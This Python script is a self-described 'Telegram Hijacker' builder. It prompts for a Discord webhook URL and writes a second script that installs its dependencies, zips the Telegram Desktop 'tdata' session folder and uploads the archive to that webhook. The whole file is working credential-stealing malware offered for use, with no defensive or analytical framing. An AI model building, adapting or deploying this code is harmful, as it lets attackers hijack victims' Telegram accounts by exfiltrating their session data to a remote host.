import os
import sys

def create_python_file(hook, user):
    template = f"""
import os

# depencies check
home = os.path.expanduser('~')
discord_path = os.path.join(home, 'AppData\\\\Local\\\\Packages\\\\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\\\\LocalCache\\\\local-packages\\\\Python311\\\\site-packages\\\\discord_webhook')
discord_status = os.path.isdir(discord_path)

for i in range(1):
    if discord_status == True:
        continue
    else:
        os.system("pip install discord_webhook zip_files")
# depencies check end

# sources
from discord_webhook import DiscordWebhook, DiscordEmbed
from zipfile import ZipFile, ZIP_DEFLATED
import zipfile

user = r'{user}' 
hook = "{hook}"
# sources end

# tdata take + archivation
with zipfile.ZipFile("tdata.zip", 'w', ZIP_DEFLATED, compresslevel=9) as archive:
    for root, dirs, files in os.walk(user):
        for file in files:
            file_path = os.path.join(root, file)
            archive.write(file_path, os.path.relpath(file_path, os.path.join(user, '..')))
# tdata take + archivation end

# discord send
def discord_send():
    webhook = DiscordWebhook(url=hook)

    with open("tdata.zip", 'rb') as f:
        webhook.add_file(file=f.read(), filename='tdata_session.zip')
    webhook.execute()

discord_send()
# discord send end
    """


    with open('generated_file.py', 'w') as f:
        f.write(template)

def main():

    RED = "\33[31m"
    logo= f"""
    {RED}
    ▄▄▄█████▓▓█████  ██▓    ▓█████   ▄████  ██▀███  ▄▄▄      ███▄ ▄███▓      ██░ ██  ██▓ ▄▄▄██▀▀▀▄▄▄      ▄████▄   ██ ▄█▀▓█████  ██▀███     
    ▓  ██▒ ▓▒▓█   ▀ ▓██▒    ▓█   ▀  ██▒ ▀█▒▓██ ▒ ██▒████▄   ▓██▒▀█▀ ██▒     ▓██░ ██▒▓██▒   ▒██  ▒████▄   ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒   
    ▒ ▓██░ ▒░▒███   ▒██░    ▒███   ▒██░▄▄▄░▓██ ░▄█ ▒██  ▀█▄ ▓██    ▓██░     ▒██▀▀██░▒██▒   ░██  ▒██  ▀█▄ ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒   
    ░ ▓██▓ ░ ▒▓█  ▄ ▒██░    ▒▓█  ▄ ░▓█  ██▓▒██▀▀█▄ ░██▄▄▄▄██▒██    ▒██      ░▓█ ░██ ░██░▓██▄██▓ ░██▄▄▄▄██▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄     
      ▒██▒ ░ ░▒████▒░██████▒░▒████▒░▒▓███▀▒░██▓ ▒██▒▓█   ▓██▒██▒   ░██▒     ░▓█▒░██▓░██░ ▓███▒   ▓█   ▓██▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒   
      ▒ ░░   ░░ ▒░ ░░ ▒░▓  ░░░ ▒░ ░ ░▒   ▒ ░ ▒▓ ░▒▓░▒▒   ▓▒█░ ▒░   ░  ░      ▒ ░░▒░▒░▓   ▒▓▒▒░   ▒▒   ▓▒█░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░   
        ░     ░ ░  ░░ ░ ▒  ░ ░ ░  ░  ░   ░   ░▒ ░ ▒░ ▒   ▒▒ ░  ░      ░      ▒ ░▒░ ░ ▒ ░ ▒ ░▒░    ▒   ▒▒ ░ ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░   
      ░         ░     ░ ░      ░   ░ ░   ░   ░░   ░  ░   ▒  ░      ░         ░  ░░ ░ ▒ ░ ░ ░ ░    ░   ▒  ░        ░ ░░ ░    ░     ░░   ░    
                ░  ░    ░  ░   ░  ░      ░    ░          ░  ░      ░         ░  ░  ░ ░   ░   ░        ░  ░ ░      ░  ░      ░  ░   ░        
                                                                                                     ░                                  """
    print(logo)

    hook = input("[Enter web hook url]: ")


    default_user = r'home, AppData\\Roaming\\Telegram Desktop\\tdata'
    

    user = input(f"[Enter path to tdata or press ENTER for default path [{default_user}]]: ")


    if not user:
        user = default_user


    create_python_file(hook, user)
    print("File 'generated_file.py' generated!")

def set_def_color():
    sys.stdout.write("\033[0m")

if __name__ == "__main__":
    main()

set_def_color()
